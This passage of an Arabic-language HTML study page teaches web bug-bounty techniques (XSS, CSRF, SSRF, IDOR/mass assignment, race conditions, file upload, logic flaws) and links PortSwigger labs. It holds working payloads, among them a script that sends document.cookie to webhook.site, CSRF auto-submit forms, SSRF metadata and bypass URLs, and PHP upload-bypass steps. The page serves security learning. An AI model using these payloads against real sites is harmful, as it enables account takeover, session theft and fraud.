          <span class="key">1.</span> <span class="val">اشتري gift card بـ $10</span><br>
          <span class="key">2.</span> <span class="val">طبّق promo code = SIGNUP30</span><br>
          <span class="key">3.</span> <span class="val">السعر يصبح $7 بدل $10</span><br>
          <span class="key">4.</span> <span class="val">استخدم الـ gift card ← ستحصل $10</span><br>
          <span class="key">5.</span> <span class="danger">ربح صافي $3 في كل دورة</span><br>
          <span class="key">6.</span> <span class="val">كرر حتى تشتري الـ jacket</span>
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">Coupon Abuse — أنواعها</div>
        <div class="section-text">
          • تطبيق نفس الكوبون أكثر من مرة<br>
          • استخدام كوبون انتهى<br>
          • Race condition في تطبيق الكوبون<br>
          • تعديل قيمة الكوبون في الـ request
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">Labs مطلوبة</div>
        <a href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money" target="_blank" class="resource-link">
          <span class="link-icon">🧪</span> Infinite Money Logic Flaw
          <span class="lab-diff diff-practitioner">Practitioner</span>
        </a>
        <a href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level" target="_blank" class="resource-link">
          <span class="link-icon">🧪</span> Low-level Logic Flaw (integer overflow)
          <span class="lab-diff diff-practitioner">Practitioner</span>
        </a>
      </div>
    </div>
  </div>

  <div class="vuln-card" onclick="toggleCard(this)">
    <div class="vuln-header">
      <div class="vuln-icon" style="background:rgba(255,214,10,0.1);">🔓</div>
      <div class="vuln-meta">
        <div class="vuln-name">Authentication - Brute Force</div>
        <div class="vuln-sub">Login Bypass · Password Attacks · 2FA Bypass</div>
      </div>
      <div class="status-badge status-progress">IN PROGRESS</div>
      <span class="chevron">▼</span>
    </div>
    <div class="vuln-body">
      <div class="section-block">
        <div class="section-title">Brute Force من الموبايل (بدون Burp)</div>
        <div class="section-text">باستخدام Tamper Dev، يمكنك:</div>
        <ol class="steps-list">
          <li>افتح صفحة Login وسجل الـ request في Tamper Dev</li>
          <li>لاحظ الـ username/password fields بالضبط</li>
          <li>غيّر الـ password لكل محاولة يدوياً (للتعلم)</li>
          <li>راقب الـ response — هل تغيّر الـ response code؟</li>
          <li>هل هناك فرق في طول الـ response؟</li>
        </ol>
        <div class="alert-box alert-warn">
          ⚠️ في PortSwigger Labs تستطيع استخدام Intruder مباشرة من المتصفح — لا تحتاج Burp Suite في Labs!
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">2FA Bypass — المفهوم</div>
        <div class="section-text">
          بعض التطبيقات تتحقق من الـ 2FA code لكن لا تتحقق من أن المستخدم الحالي هو نفسه من بدأ الـ session. جرّب:
        </div>
        <div class="code-block">
          <span class="comment"># بعد login بحسابك</span><br>
          <span class="key">GET</span> <span class="val">/my-account?id=carlos</span><br>
          <span class="comment"># هل يمكن تخطي 2FA بتغيير الـ URL مباشرة؟</span>
        </div>
      </div>
    </div>
  </div>

  <div style="height: 12px;"></div>

  <!-- TODO -->
  <div style="font-size:11px; font-family:var(--mono); color:var(--red); letter-spacing:2px; margin-bottom:10px; display:flex; align-items:center; gap:6px;">
    <span>●</span> TODO — لم تتعلمها بعد
  </div>

  <div style="display:flex; gap:8px; flex-wrap:wrap; margin-bottom:12px;">
    <span class="tag high">XSS</span>
    <span class="tag high">CSRF</span>
    <span class="tag high">SSRF</span>
    <span class="tag med">API Security</span>
    <span class="tag med">Race Conditions</span>
    <span class="tag med">File Upload</span>
  </div>
  <div class="alert-box alert-info">
    💡 انتقل لتبويبات XSS، CSRF، SSRF، API، Race Conditions، File Upload لشرح مفصل + labs لكل ثغرة
  </div>
</div>

<!-- ===== XSS TAB ===== -->
<div id="tab-xss" class="content">

  <div class="vuln-card">
    <div class="vuln-header" onclick="toggleCard(this.parentElement)">
      <div class="vuln-icon" style="background:rgba(255,77,109,0.1);">⚡</div>
      <div class="vuln-meta">
        <div class="vuln-name">Reflected XSS</div>
        <div class="vuln-sub">أخطر وأشيع أنواع XSS في Bug Bounty</div>
      </div>
      <div class="status-badge status-todo">TODO</div>
      <span class="chevron">▼</span>
    </div>
    <div class="vuln-body">
      <div class="section-block">
        <div class="section-title">ما هي الثغرة</div>
        <div class="section-text">
          الـ server يأخذ input من المستخدم (عبر URL أو form) ويعيد عرضه في الـ HTML مباشرة بدون تنقية. المهاجم يرسل رابط خبيث للضحية، وعند فتحه يُنفَّذ JavaScript في المتصفح.
        </div>
        <div class="code-block">
          <span class="comment"># URL طبيعي</span><br>
          <span class="val">https://site.com/search?q=shoes</span><br><br>
          <span class="comment"># URL مهاجم (Reflected XSS)</span><br>
          <span class="danger">https://site.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</span><br><br>
          <span class="comment"># الـ HTML الناتج في الصفحة</span><br>
          <span class="val">You searched for: </span><span class="danger">&lt;script&gt;alert(1)&lt;/script&gt;</span>
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">كيف تحدث في التطبيقات الحقيقية</div>
        <div class="section-text">
          • Search bars — الأكثر شيوعاً<br>
          • Error messages ("User 'X' not found")<br>
          • URL path parameters (/user/PAYLOAD/profile)<br>
          • HTTP headers مثل Referer أو User-Agent<br>
          • Form inputs المعادة في الصفحة
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">مثال حقيقي من HackerOne</div>
        <div class="alert-box alert-info">
          🏆 تم اكتشاف Reflected XSS في Twitter (2020) عبر parameter في صفحة الـ search. المكافأة: $1,540. الـ payload كان في الـ q parameter مع bypass للـ filter باستخدام SVG tag.
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">كيف تكتشفها — Mobile Bug Hunting</div>
        <ol class="steps-list">
          <li>افتح أي صفحة تحتوي على search أو input يظهر في الصفحة</li>
          <li>اكتب في Kiwi Browser DevTools Console: ثم ابحث عن الـ parameter في الـ URL</li>
          <li>جرّب أولاً: <code style="font-family:var(--mono); color:var(--accent3); font-size:11px;">"'&lt;&gt;</code> وشوف إذا ظهرت كما هي أو تغيّرت</li>
          <li>إذا لم يتم Encode الأحرف → مشبوه → جرّب XSS payload</li>
          <li>استخدم Tamper Dev لتعديل الـ request وإضافة الـ payload</li>
        </ol>
        <div class="tool-tags">
          <span class="tool-tag">Kiwi Browser</span>
          <span class="tool-tag">Tamper Dev</span>
          <span class="tool-tag">HackBar</span>
          <span class="tool-tag">DevTools Console</span>
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">Payloads — من الأبسط للأعقد</div>
        <div class="code-block">
          <span class="comment"># Basic test</span><br>
          <span class="danger">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><br>
          <span class="comment"># إذا فُلتر script</span><br>
          <span class="danger">&lt;img src=x onerror=alert(1)&gt;</span><br><br>
          <span class="comment"># إذا فُلتر onerror</span><br>
          <span class="danger">&lt;svg onload=alert(1)&gt;</span><br><br>
          <span class="comment"># إذا فُلتر الأقواس الزاوية</span><br>
          <span class="danger">" onmouseover="alert(1)</span><br><br>
          <span class="comment"># لـ Bug Bounty Report (proof of concept)</span><br>
          <span class="danger">&lt;script&gt;alert(document.domain)&lt;/script&gt;</span>
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">الإصلاح (للمطور)</div>
        <div class="section-text">
          ✅ HTML Encode كل output: &lt; → &amp;lt; &gt; → &amp;gt;<br>
          ✅ استخدم Content Security Policy (CSP)<br>
          ✅ لا تضع user input في innerHTML مباشرة<br>
          ✅ استخدم textContent بدل innerHTML
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">Labs PortSwigger</div>
        <a href="https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded" target="_blank" class="resource-link">
          <span class="link-icon">🧪</span> Reflected XSS into HTML context — No Encoding
          <span class="lab-diff diff-apprentice">Apprentice</span>
        </a>
        <a href="https://portswigger.net/web-security/cross-site-scripting/reflected/lab-attribute-angle-brackets-html-encoded" target="_blank" class="resource-link">
          <span class="link-icon">🧪</span> Reflected XSS — Attribute with filter bypass
          <span class="lab-diff diff-practitioner">Practitioner</span>
        </a>
        <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" class="resource-link">
          <span class="link-icon">📋</span> XSS Cheat Sheet — PortSwigger
        </a>
      </div>
      <div class="section-block">
        <div class="section-title">مصادر</div>
        <div class="resource-links">
          <a href="https://owasp.org/www-community/attacks/xss/" target="_blank" class="resource-link"><span class="link-icon">🔴</span> OWASP XSS</a>
          <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" class="resource-link"><span class="link-icon">🟢</span> PortSwigger XSS Academy</a>
          <a href="https://hackerone.com/hacktivity?querystring=xss" target="_blank" class="resource-link"><span class="link-icon">💰</span> HackerOne XSS Reports</a>
        </div>
      </div>
    </div>
  </div>

  <div class="vuln-card">
    <div class="vuln-header" onclick="toggleCard(this.parentElement)">
      <div class="vuln-icon" style="background:rgba(255,77,109,0.1);">💾</div>
      <div class="vuln-meta">
        <div class="vuln-name">Stored XSS</div>
        <div class="vuln-sub">أخطر من Reflected — يؤثر على كل من يفتح الصفحة</div>
      </div>
      <div class="status-badge status-todo">TODO</div>
      <span class="chevron">▼</span>
    </div>
    <div class="vuln-body">
      <div class="section-block">
        <div class="section-title">الفرق عن Reflected</div>
        <div class="section-text">
          في Stored XSS، يُحفَظ الـ payload في قاعدة البيانات وينفَّذ لكل من يفتح الصفحة — بدون الحاجة لإرسال رابط. هذا يعني:
          <br>• بإمكانك سرقة cookies من admin بمجرد أن يفتح الصفحة
          <br>• تأثير أوسع بكثير
          <br>• مكافآت أعلى في Bug Bounty
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">أماكن الاختبار</div>
        <div class="section-text">
          • Comments/Reviews sections<br>
          • Profile name / Bio / Avatar alt text<br>
          • Support tickets<br>
          • Product reviews<br>
          • Chat messages
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">Payload لـ Cookie Stealing</div>
        <div class="code-block">
          <span class="comment"># في Bug Bounty تستخدم Burp Collaborator</span><br>
          <span class="comment"># من الموبايل استخدم: webhook.site أو interactsh</span><br><br>
          <span class="danger">&lt;script&gt;</span><br>
          <span class="val">  fetch('https://webhook.site/YOUR-ID?c='+document.cookie)</span><br>
          <span class="danger">&lt;/script&gt;</span><br><br>
          <span class="comment"># أو باستخدام img</span><br>
          <span class="danger">&lt;img src="https://webhook.site/YOUR-ID?c="</span><br>
          <span class="danger">     onerror="this.src+document.cookie"&gt;</span>
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">Labs PortSwigger</div>
        <a href="https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded" target="_blank" class="resource-link">
          <span class="link-icon">🧪</span> Stored XSS into HTML context
          <span class="lab-diff diff-apprentice">Apprentice</span>
        </a>
        <a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf" target="_blank" class="resource-link">
          <span class="link-icon">🧪</span> Exploiting XSS to perform CSRF
          <span class="lab-diff diff-practitioner">Practitioner</span>
        </a>
      </div>
    </div>
  </div>

  <div class="vuln-card">
    <div class="vuln-header" onclick="toggleCard(this.parentElement)">
      <div class="vuln-icon" style="background:rgba(255,77,109,0.1);">🌐</div>
      <div class="vuln-meta">
        <div class="vuln-name">DOM-based XSS</div>
        <div class="vuln-sub">في JavaScript المتصفح — لا يصل للـ Server</div>
      </div>
      <div class="status-badge status-todo">TODO</div>
      <span class="chevron">▼</span>
    </div>
    <div class="vuln-body">
      <div class="section-block">
        <div class="section-title">المفهوم</div>
        <div class="section-text">
          DOM XSS يحدث عندما يقرأ JavaScript في الصفحة بيانات من المستخدم (مثل URL hash أو location.search) ويضعها في الـ DOM بدون تنقية. الـ request لا يذهب للـ server!
        </div>
        <div class="code-block">
          <span class="comment"># Source: المكان الذي يقرأ منه JS البيانات</span><br>
          <span class="val">document.location.hash</span><br>
          <span class="val">document.URL</span><br>
          <span class="val">window.location.search</span><br><br>
          <span class="comment"># Sink: المكان الذي يُكتب فيه في DOM</span><br>
          <span class="danger">innerHTML</span><br>
          <span class="danger">document.write()</span><br>
          <span class="danger">eval()</span>
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">كيف تكتشفها من الموبايل</div>
        <ol class="steps-list">
          <li>افتح DevTools في Kiwi Browser</li>
          <li>اضغط Sources أو Console</li>
          <li>ابحث عن: innerHTML, document.write, eval</li>
          <li>شوف هل تأخذ قيمة من URL أو cookies</li>
          <li>جرّب: site.com/page#&lt;img src=x onerror=alert(1)&gt;</li>
        </ol>
      </div>
      <div class="section-block">
        <div class="section-title">Labs PortSwigger</div>
        <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink" target="_blank" class="resource-link">
          <span class="link-icon">🧪</span> DOM XSS via document.write
          <span class="lab-diff diff-apprentice">Apprentice</span>
        </a>
        <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink" target="_blank" class="resource-link">
          <span class="link-icon">🧪</span> DOM XSS in jQuery href attribute sink
          <span class="lab-diff diff-practitioner">Practitioner</span>
        </a>
      </div>
    </div>
  </div>
</div>

<!-- ===== CSRF TAB ===== -->
<div id="tab-csrf" class="content">
  <div class="vuln-card">
    <div class="vuln-header" onclick="toggleCard(this.parentElement)">
      <div class="vuln-icon" style="background:rgba(255,77,109,0.1);">🔄</div>
      <div class="vuln-meta">
        <div class="vuln-name">CSRF - Cross-Site Request Forgery</div>
        <div class="vuln-sub">تغيير Email • تغيير Password • تحويل أموال</div>
      </div>
      <div class="status-badge status-todo">TODO</div>
      <span class="chevron">▼</span>
    </div>
    <div class="vuln-body">
      <div class="section-block">
        <div class="section-title">ما هي الثغرة</div>
        <div class="section-text">
          المهاجم يصنع صفحة تحتوي على request خفي يُرسَل من متصفح الضحية باسمها وبصلاحياتها — دون علمها. يعمل لأن المتصفح يرسل الـ cookies تلقائياً مع كل request.
        </div>
        <div class="code-block">
          <span class="comment"># صفحة المهاجم تحتوي على:</span><br>
          <span class="danger">&lt;form action="https://bank.com/transfer" method="POST"&gt;</span><br>
          <span class="val">  &lt;input name="amount" value="10000"&gt;</span><br>
          <span class="val">  &lt;input name="to" value="attacker_account"&gt;</span><br>
          <span class="danger">&lt;/form&gt;</span><br>
          <span class="danger">&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</span>
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">كيف تكتشفها</div>
        <ol class="steps-list">
          <li>في Tamper Dev، افتح الـ requests عند تغيير email/password</li>
          <li>هل يوجد CSRF token في الـ form؟</li>
          <li>إذا لا token → مشبوه!</li>
          <li>جرّب إرسال نفس الـ request بدون الـ Referer header</li>
          <li>جرّب تغيير الـ Content-Type من application/json لـ text/plain</li>
        </ol>
      </div>
      <div class="section-block">
        <div class="section-title">CSRF PoC — كيف تبنيه</div>
        <div class="code-block">
          <span class="comment">&lt;!-- CSRF PoC لتغيير email --&gt;</span><br>
          <span class="danger">&lt;html&gt;</span><br>
          <span class="val">  &lt;body onload="document.forms[0].submit()"&gt;</span><br>
          <span class="val">    &lt;form action="https://target.com/change-email" method="POST"&gt;</span><br>
          <span class="danger">      &lt;input name="email" value="<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b4d5c0c0d5d7dfd1c6f4d1c2ddd89ad7dbd9">[email&#160;protected]</a>"&gt;</span><br>
          <span class="val">    &lt;/form&gt;</span><br>
          <span class="val">  &lt;/body&gt;</span><br>
          <span class="danger">&lt;/html&gt;</span>
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">CSRF Token Bypasses</div>
        <div class="section-text">
          حتى لو وجد CSRF token، جرّب:<br>
          • حذف الـ token كلياً من الـ request<br>
          • إرسال token فارغ<br>
          • استخدام token من حساب آخر<br>
          • تغيير method من POST لـ GET
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">Labs PortSwigger</div>
        <a href="https://portswigger.net/web-security/csrf/lab-no-defenses" target="_blank" class="resource-link">
          <span class="link-icon">🧪</span> CSRF vulnerability with no defenses
          <span class="lab-diff diff-apprentice">Apprentice</span>
        </a>
        <a href="https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session" target="_blank" class="resource-link">
          <span class="link-icon">🧪</span> CSRF token not tied to user session
          <span class="lab-diff diff-practitioner">Practitioner</span>
        </a>
        <a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect" target="_blank" class="resource-link">
          <span class="link-icon">🧪</span> SameSite Strict bypass via redirect
          <span class="lab-diff diff-practitioner">Practitioner</span>
        </a>
      </div>
    </div>
  </div>
</div>

<!-- ===== SSRF TAB ===== -->
<div id="tab-ssrf" class="content">
  <div class="vuln-card">
    <div class="vuln-header" onclick="toggleCard(this.parentElement)">
      <div class="vuln-icon" style="background:rgba(255,77,109,0.1);">🌐</div>
      <div class="vuln-meta">
        <div class="vuln-name">SSRF - Server Side Request Forgery</div>
        <div class="vuln-sub">إجبار الـ Server على الاتصال بموارد داخلية</div>
      </div>
      <div class="status-badge status-todo">TODO</div>
      <span class="chevron">▼</span>
    </div>
    <div class="vuln-body">
      <div class="section-block">
        <div class="section-title">ما هي الثغرة</div>
        <div class="section-text">
          الـ server يقبل URL من المستخدم ويقوم بعمل request له — مما يتيح للمهاجم إجبار الـ server على الاتصال بأنظمة داخلية لا يجب أن تكون متاحة خارجياً.
        </div>
        <div class="code-block">
          <span class="comment"># طبيعي — يجلب صورة</span><br>
          <span class="key">POST</span> /fetch-image<br>
          <span class="val">url=https://external-site.com/image.jpg</span><br><br>
          <span class="comment"># SSRF — يستهدف الشبكة الداخلية</span><br>
          <span class="key">POST</span> /fetch-image<br>
          <span class="danger">url=http://192.168.1.1/admin</span><br><br>
          <span class="comment"># SSRF ضد AWS Metadata</span><br>
          <span class="danger">url=http://169.254.169.254/latest/meta-data/</span>
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">أماكن البحث عن SSRF</div>
        <div class="section-text">
          • أي parameter يحتوي على URL أو ip أو host أو path أو dest<br>
          • Webhook URLs<br>
          • PDF generators<br>
          • Image fetching/resizing<br>
          • Import from URL feature<br>
          • curl أو fetch في API
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">كيف تختبر من الموبايل</div>
        <ol class="steps-list">
          <li>استخدم webhook.site وانسخ الـ URL</li>
          <li>في Tamper Dev، عدّل أي parameter يحتوي URL</li>
          <li>ضع URL الـ webhook بدلاً منه</li>
          <li>إذا وصل request لـ webhook → SSRF confirmed!</li>
          <li>ثم جرّب: http://localhost, http://127.0.0.1, http://169.254.169.254</li>
        </ol>
        <div class="tool-tags">
          <span class="tool-tag">webhook.site</span>
          <span class="tool-tag">Tamper Dev</span>
          <span class="tool-tag">interactsh</span>
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">SSRF Bypasses الشائعة</div>
        <div class="code-block">
          <span class="comment"># إذا فُلتر 127.0.0.1</span><br>
          <span class="val">http://127.1</span><br>
          <span class="val">http://0x7f000001</span><br>
          <span class="val">http://2130706433</span><br>
          <span class="val">http://localhost</span><br><br>
          <span class="comment"># Open Redirect كـ bypass</span><br>
          <span class="val">https://allowed-site.com/redirect?url=http://127.0.0.1</span><br><br>
          <span class="comment"># DNS rebinding</span><br>
          <span class="val">http://attacker.com/ → resolves to 127.0.0.1</span>
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">Labs PortSwigger</div>
        <a href="https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost" target="_blank" class="resource-link">
          <span class="link-icon">🧪</span> Basic SSRF against localhost
          <span class="lab-diff diff-apprentice">Apprentice</span>
        </a>
        <a href="https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter" target="_blank" class="resource-link">
          <span class="link-icon">🧪</span> SSRF with blacklist-based filter bypass
          <span class="lab-diff diff-practitioner">Practitioner</span>
        </a>
        <a href="https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection" target="_blank" class="resource-link">
          <span class="link-icon">🧪</span> SSRF bypass via open redirect
          <span class="lab-diff diff-practitioner">Practitioner</span>
        </a>
      </div>
    </div>
  </div>
</div>

<!-- ===== API TAB ===== -->
<div id="tab-api" class="content">
  <div class="vuln-card">
    <div class="vuln-header" onclick="toggleCard(this.parentElement)">
      <div class="vuln-icon" style="background:rgba(255,77,109,0.1);">🔌</div>
      <div class="vuln-meta">
        <div class="vuln-name">API Security & BOLA/IDOR</div>
        <div class="vuln-sub">Broken Object Level Authorization</div>
      </div>
      <div class="status-badge status-todo">TODO</div>
      <span class="chevron">▼</span>
    </div>
    <div class="vuln-body">
      <div class="section-block">
        <div class="section-title">BOLA/IDOR في APIs</div>
        <div class="section-text">
          BOLA (Broken Object Level Authorization) هو IDOR لكن في APIs. الـ API لا تتحقق إذا كان المستخدم يملك صلاحية الوصول للـ object المطلوب.
        </div>
        <div class="code-block">
          <span class="comment"># طبيعي</span><br>
          <span class="key">GET</span> <span class="val">/api/v1/orders/1337</span><br>
          <span class="val">Authorization: Bearer YOUR-TOKEN</span><br><br>
          <span class="comment"># BOLA — الوصول لطلب شخص آخر</span><br>
          <span class="key">GET</span> <span class="danger">/api/v1/orders/1338</span><br>
          <span class="val">Authorization: Bearer YOUR-TOKEN</span><br>
          <span class="comment"># هل يُرجع بيانات؟ → BOLA!</span>
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">كيف تكشف الـ API Endpoints</div>
        <ol class="steps-list">
          <li>في Kiwi Browser DevTools → Network tab</li>
          <li>استخدم التطبيق بشكل طبيعي وراقب الـ requests</li>
          <li>ابحث عن endpoints تشبه: /api/, /v1/, /v2/, /rest/</li>
          <li>جرّب تغيير الـ IDs في كل endpoint</li>
          <li>ابحث عن JavaScript files — غالباً تحتوي API endpoints مخفية</li>
        </ol>
      </div>
      <div class="section-block">
        <div class="section-title">API Versioning Attack</div>
        <div class="code-block">
          <span class="comment"># الـ endpoint الحالي محمي</span><br>
          <span class="val">/api/v2/user/profile</span><br><br>
          <span class="comment"># جرّب النسخة القديمة</span><br>
          <span class="danger">/api/v1/user/profile</span><br>
          <span class="danger">/api/user/profile</span><br>
          <span class="danger">/api/mobile/user/profile</span>
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">مثال حقيقي — HackerOne</div>
        <div class="alert-box alert-info">
          🏆 تم اكتشاف BOLA في Uber API (2019): /api/v2/partners/{id}/trips كان يُرجع trips لأي driver عند تغيير الـ ID. مكافأة $6,500.
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">Mass Assignment Attack</div>
        <div class="code-block">
          <span class="comment"># Request عادي لتحديث الـ profile</span><br>
          <span class="key">PUT</span> /api/user/update<br>
          <span class="val">{"name": "John", "email": "<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="5f353037311f27713c3032">[email&#160;protected]</a>"}</span><br><br>
          <span class="comment"># جرّب إضافة fields غير متوقعة</span><br>
          <span class="danger">{"name": "John", "email": "<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="1f757077715f67317c7072">[email&#160;protected]</a>",</span><br>
          <span class="danger"> "role": "admin", "isVerified": true,</span><br>
          <span class="danger"> "credits": 99999}</span>
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">Labs PortSwigger</div>
        <a href="https://portswigger.net/web-security/api-testing/lab-exploiting-api-endpoint-using-documentation" target="_blank" class="resource-link">
          <span class="link-icon">🧪</span> Exploiting API endpoint using documentation
          <span class="lab-diff diff-apprentice">Apprentice</span>
        </a>
        <a href="https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability" target="_blank" class="resource-link">
          <span class="link-icon">🧪</span> Exploiting Mass Assignment
          <span class="lab-diff diff-practitioner">Practitioner</span>
        </a>
        <a href="https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/" target="_blank" class="resource-link">
          <span class="link-icon">🔴</span> OWASP API Security Top 10
        </a>
      </div>
    </div>
  </div>
</div>

<!-- ===== RACE CONDITIONS TAB ===== -->
<div id="tab-race" class="content">
  <div class="vuln-card">
    <div class="vuln-header" onclick="toggleCard(this.parentElement)">
      <div class="vuln-icon" style="background:rgba(255,77,109,0.1);">⏱️</div>
      <div class="vuln-meta">
        <div class="vuln-name">Race Conditions</div>
        <div class="vuln-sub">Multiple Payment • Coupon Reuse • Double Withdrawal</div>
      </div>
      <div class="status-badge status-todo">TODO</div>
      <span class="chevron">▼</span>
    </div>
    <div class="vuln-body">
      <div class="section-block">
        <div class="section-title">ما هي Race Conditions</div>
        <div class="section-text">
          تحدث عندما يعتمد التطبيق على ترتيب معين للعمليات، لكن يمكن للمهاجم إرسال requests متعددة في نفس اللحظة لكسر هذا الترتيب. مثلاً: استخدام coupon مرتين قبل أن يُسجَّل الاستخدام الأول.
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">كيف تختبر من الموبايل</div>
        <div class="section-text">
          الـ Race Conditions صعبة بدون أدوات متخصصة، لكن يمكنك:
        </div>
        <ol class="steps-list">
          <li>افتح الموقع في تبويبين مختلفين في Kiwi Browser</li>
          <li>سجّل دخول بنفس الحساب في التبويبين</li>
          <li>في نفس اللحظة تقريباً، اضغط apply coupon في التبويبين</li>
          <li>إذا طُبِّق مرتين → Race Condition!</li>
          <li>يمكن أيضاً استخدام JavaScript في Console لإرسال requests متعددة</li>
        </ol>
        <div class="code-block">
          <span class="comment"># في DevTools Console</span><br>
          <span class="key">// إرسال 10 requests في نفس الوقت</span><br>
          <span class="val">const reqs = [];</span><br>
          <span class="val">for(let i=0; i&lt;10; i++) {</span><br>
          <span class="danger">  reqs.push(fetch('/apply-coupon', {</span><br>
          <span class="val">    method: 'POST',</span><br>
          <span class="val">    body: 'code=SAVE20'</span><br>
          <span class="danger">  }));</span><br>
          <span class="val">}</span><br>
          <span class="val">Promise.all(reqs).then(r => console.log(r));</span>
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">مثال حقيقي</div>
        <div class="alert-box alert-info">
          🏆 Race Condition في Coinbase (2017): إرسال transfer requests متعددة في آن واحد أدى لخصم المبلغ مرة واحدة لكن الإرسال تكرر. مكافأة: $30,000.
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">Labs PortSwigger</div>
        <a href="https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun" target="_blank" class="resource-link">
          <span class="link-icon">🧪</span> Limit Overrun Race Condition
          <span class="lab-diff diff-practitioner">Practitioner</span>
        </a>
        <a href="https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits" target="_blank" class="resource-link">
          <span class="link-icon">🧪</span> Bypassing Rate Limits via Race Conditions
          <span class="lab-diff diff-practitioner">Practitioner</span>
        </a>
      </div>
    </div>
  </div>
</div>

<!-- ===== FILE UPLOAD TAB ===== -->
<div id="tab-upload" class="content">
  <div class="vuln-card">
    <div class="vuln-header" onclick="toggleCard(this.parentElement)">
      <div class="vuln-icon" style="background:rgba(255,77,109,0.1);">📁</div>
      <div class="vuln-meta">
        <div class="vuln-name">File Upload Vulnerabilities</div>
        <div class="vuln-sub">Unrestricted Upload · MIME Bypass · Web Shell</div>
      </div>
      <div class="status-badge status-todo">TODO</div>
      <span class="chevron">▼</span>
    </div>
    <div class="vuln-body">
      <div class="section-block">
        <div class="section-title">أنواع الهجمات</div>
        <div class="section-text">
          <strong>1. Web Shell Upload</strong> — رفع PHP/ASP shell للتنفيذ على الـ server<br>
          <strong>2. Content-Type Bypass</strong> — تغيير Content-Type لخداع الـ filter<br>
          <strong>3. Extension Bypass</strong> — استخدام .php5, .phtml, .PHP<br>
          <strong>4. Double Extension</strong> — file.php.jpg<br>
          <strong>5. Null Byte</strong> — file.php%00.jpg
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">الاختبار من الموبايل (Tamper Dev)</div>
        <ol class="steps-list">
          <li>ارفع صورة طبيعية وسجّل الـ request في Tamper Dev</li>
          <li>لاحظ الـ Content-Type (image/jpeg) واسم الملف</li>
          <li>أنشئ ملف اختبار: test.php بهذا المحتوى: &lt;?php phpinfo(); ?&gt;</li>
          <li>غيّر اسم الملف في الـ request من image.jpg لـ test.php</li>
          <li>غيّر Content-Type لـ image/jpeg (احتفظ بها كصورة ظاهرياً)</li>
          <li>أرسل الـ request وشوف إذا قُبِل الملف</li>
          <li>إذا نجح، ابحث عن رابط الملف المرفوع وافتحه</li>
        </ol>
      </div>
      <div class="section-block">
        <div class="section-title">Polyglot File</div>
        <div class="code-block">
          <span class="comment"># ملف JPEG صالح يحتوي PHP code مخفي</span><br>
          <span class="comment"># يتم قبوله كـ image لكن يُنفَّذ كـ PHP</span><br>
          <span class="val">exiftool -Comment="&lt;?php phpinfo(); ?&gt;" image.jpg</span><br>
          <span class="comment"># ثم حوّله لـ image.php</span>
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">Labs PortSwigger</div>
        <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass" target="_blank" class="resource-link">
          <span class="link-icon">🧪</span> Web shell via Content-Type bypass
          <span class="lab-diff diff-apprentice">Apprentice</span>
        </a>
        <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal" target="_blank" class="resource-link">
          <span class="link-icon">🧪</span> Web shell via path traversal
          <span class="lab-diff diff-practitioner">Practitioner</span>
        </a>
        <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension" target="_blank" class="resource-link">
          <span class="link-icon">🧪</span> Web shell via obfuscated extension
          <span class="lab-diff diff-practitioner">Practitioner</span>
        </a>
      </div>
    </div>
  </div>
</div>

<!-- ===== MOBILE SETUP TAB ===== -->
<div id="tab-mobile" class="content">
